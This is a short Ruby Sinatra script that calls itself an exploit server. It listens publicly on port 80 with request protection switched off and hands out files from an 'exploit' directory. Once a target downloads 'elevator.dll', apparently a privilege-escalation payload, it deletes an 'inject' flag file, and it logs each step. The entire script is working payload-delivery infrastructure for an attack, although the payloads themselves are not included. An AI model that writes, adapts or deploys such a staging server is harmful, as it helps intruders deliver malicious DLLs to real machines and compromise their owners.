#!/usr/bin/env ruby

require 'sinatra'
require 'fileutils'

def log(text)
  File.open('data/exploit.log', 'a+') {|f| f.write text}
  puts text
end

def disable_injection
  log "Disabling injection..."
  if File.exist?('inject')
    FileUtils.rm_f 'inject'
    log "Injection disabled"
  end
end

configure do
  set :bind, '0.0.0.0'
  set :port, 80
  disable :protection

  FileUtils.rm_f 'data/exploit.log' rescue nil
  log "Starting exploit server..."
end

get '/:file' do
  log "Serving #{params[:file]}"

  disable_injection if params[:file].eql? 'elevator.dll'

  send_file "./exploit/#{params[:file]}"
end

